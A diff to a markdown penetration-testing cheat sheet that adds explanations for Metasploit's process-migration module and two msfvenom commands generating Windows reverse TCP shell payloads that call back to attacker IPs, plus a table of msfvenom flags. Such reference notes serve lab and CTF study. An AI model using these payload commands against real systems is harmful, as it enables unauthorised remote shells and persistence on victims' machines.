@@ -127,12 +127,15 @@ show exploits                      > show exploits
 show -h                            > show help
 ```
 
+<br>
+
 ## Metasploit Modules
 
 Some usefull modules that can be used in Metasploit.
 
 ```
 run post/windows/manage/migrate
+
 > Run the migrate module that can be used to inject into another process to create persistence
 ```
 
@@ -143,16 +146,27 @@ run post/windows/manage/migrate
 ```
 msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.18.78.136 LPORT=443 -b '\x0a\x0d\x00' -f c
 
+> Creates a unstaged reverse TCP shell in c format, to be used on a 32-bit windows system.
+> Attack host IP and port are also included. 
+
+
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
+
+> Creates an unstaged reverse TCP shell in exe format to be used on a 64-bit windows system.
+> Attack host IP and port are also included as well as an output name.
 ```
 
 🔰 msfvenom argument | ℹ️ Function
 -- | --
+**`-a`** | Specifies an architecture type of the machine the payload will be used
+**`-p`** | Specifies the payload (type) to be used
+**`--platform`** | Specifies the platform of the machine the payload will be used
 **`-l / --list formats`** | Show all available formats
 **`-l / --list payloads`** | Show all available payloads
 **`-e`** | Specifies the encoding format
 **`-f`** | Specifies the output format (extension)
 **`-o`** | Specifies the output location
+**`-b`** | A list of characters to avoid
 
 <br>
 
